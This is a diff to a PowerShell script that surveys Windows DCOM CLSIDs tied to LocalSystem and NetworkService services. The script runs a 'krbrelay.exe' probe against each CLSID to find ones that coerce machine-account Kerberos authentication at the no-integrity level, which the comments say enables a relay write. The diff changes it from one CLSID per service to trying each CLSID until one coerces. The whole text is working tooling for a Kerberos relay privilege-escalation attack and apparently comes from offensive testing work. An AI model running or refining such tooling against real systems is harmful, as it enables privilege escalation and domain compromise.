@@ -1,16 +1,17 @@
 # Survey DCOM triggers for a level-2 (no-integrity) coerced context.
 #
-# The coerced auth level is a property of the backing service, not the CLSID, so
-# this probes one representative CLSID per service. It covers services that run as
-# the machine account (LocalSystem or NetworkService), skips disabled services,
-# and bounds each probe with a timeout. It runs the probe exe with KRBRELAY_PROBE
-# set (no relay needed) and reports the coerced auth level.
+# The coerced auth level is a property of the backing service, not the CLSID, but
+# not every CLSID of a service triggers the coercion callback. So this groups
+# CLSIDs by backing service and tries them until one coerces (prints a level),
+# then moves to the next service. It covers services that run as the machine
+# account (LocalSystem or NetworkService), skips disabled services, and bounds
+# each probe with a timeout. It runs the probe exe with KRBRELAY_PROBE set.
 #
 # auth_level=2 (CONNECT, no integrity) is the one that makes the direct-kerberos
 # post-bind write work. auth_level=5/6 (packet integrity/privacy) blocks it.
 #
-# Run in an operator session (the coercion does not fire in a session-0 WinRM
-# shell). Point -Exe at the built probe exe from branch exp/direct-kerberos.
+# Run in the SAME operator session where a direct exe run coerces. In a session-0
+# shell the activation returns E_NOINTERFACE and nothing coerces.
 #
 #   .\survey_triggers.ps1 -Exe .\krbrelay.exe
 #
@@ -31,8 +32,8 @@ Get-ChildItem 'HKLM:\SOFTWARE\Classes\AppID' -ErrorAction SilentlyContinue | For
 }
 
 # Services that run as the machine account and are not disabled. LocalSystem and
-# NetworkService both authenticate as the computer account on the network.
-# LocalService is anonymous, so it is excluded.
+# NetworkService both authenticate as the computer account. LocalService is
+# anonymous, so it is excluded.
 $svcInfo = @{}
 Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
     $machine = ($_.StartName -eq 'LocalSystem') -or ($_.StartName -like '*NetworkService')
@@ -41,34 +42,38 @@ Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
     }
 }
 
-# One representative CLSID per backing service.
-$svcToClsid = @{}
+# All CLSIDs grouped by backing service.
+$svcToClsids = @{}
 Get-ChildItem 'HKLM:\SOFTWARE\Classes\CLSID' -ErrorAction SilentlyContinue | ForEach-Object {
     $appid = (Get-ItemProperty $_.PSPath -Name 'AppID' -ErrorAction SilentlyContinue).AppID
     if ($appid -and $appidToSvc.ContainsKey($appid.ToUpper())) {
         $svc = $appidToSvc[$appid.ToUpper()].ToLower()
-        if ($svcInfo.ContainsKey($svc) -and -not $svcToClsid.ContainsKey($svc)) {
-            $svcToClsid[$svc] = $_.PSChildName
+        if ($svcInfo.ContainsKey($svc)) {
+            if (-not $svcToClsids.ContainsKey($svc)) { $svcToClsids[$svc] = @() }
+            $svcToClsids[$svc] += $_.PSChildName
         }
     }
 }
 
-Write-Host ("[*] {0} candidate services (LocalSystem/NetworkService, not disabled), one CLSID each" -f $svcToClsid.Count)
+Write-Host ("[*] {0} candidate services (LocalSystem/NetworkService, not disabled)" -f $svcToClsids.Count)
 $tmp = [System.IO.Path]::GetTempFileName()
 $err = "$tmp.err"
-foreach ($svc in ($svcToClsid.Keys | Sort-Object)) {
-    $clsid = $svcToClsid[$svc]
-    $p = Start-Process -FilePath $Exe `
-        -ArgumentList @('127.0.0.1', '9999', $Spn, '127.0.0.1', '7989', $clsid) `
-        -NoNewWindow -PassThru -RedirectStandardOutput $tmp -RedirectStandardError $err
-    $note = ""
-    if (-not $p.WaitForExit($TimeoutSec * 1000)) {
-        try { $p.Kill() } catch {}
-        $note = "TIMEOUT"
+foreach ($svc in ($svcToClsids.Keys | Sort-Object)) {
+    $acct = $svcInfo[$svc].Account
+    $mode = $svcInfo[$svc].Mode
+    $result = ""
+    $usedClsid = ""
+    foreach ($clsid in $svcToClsids[$svc]) {
+        $usedClsid = $clsid
+        $p = Start-Process -FilePath $Exe `
+            -ArgumentList @('127.0.0.1', '9999', $Spn, '127.0.0.1', '7989', $clsid) `
+            -NoNewWindow -PassThru -RedirectStandardOutput $tmp -RedirectStandardError $err
+        if (-not $p.WaitForExit($TimeoutSec * 1000)) { try { $p.Kill() } catch {}; $result = "TIMEOUT"; continue }
+        $out = ((Get-Content $tmp, $err -ErrorAction SilentlyContinue) -join "`n")
+        $probe = (($out -split "`r?`n") | Where-Object { $_ -match '\[probe\]' }) -join ' '
+        if ($probe) { $result = $probe.Trim(); break }
+        $result = ((($out -split "`r?`n") | Where-Object { $_ -match 'stage' }) -join ' ').Trim()
     }
-    $out = ((Get-Content $tmp, $err -ErrorAction SilentlyContinue) -join "`n")
-    $probe = (($out -split "`r?`n") | Where-Object { $_ -match '\[probe\]' }) -join ' '
-    if (-not $probe) { $probe = (($out -split "`r?`n") | Where-Object { $_ -match 'stage' }) -join ' ' }
-    "{0}  svc={1} acct={2} start={3} {4} => {5}" -f $clsid, $svc, $svcInfo[$svc].Account, $svcInfo[$svc].Mode, $note, $probe.Trim()
+    "{0}  svc={1} acct={2} start={3}  => {4}" -f $usedClsid, $svc, $acct, $mode, $result
 }
 Remove-Item $tmp, $err -ErrorAction SilentlyContinue
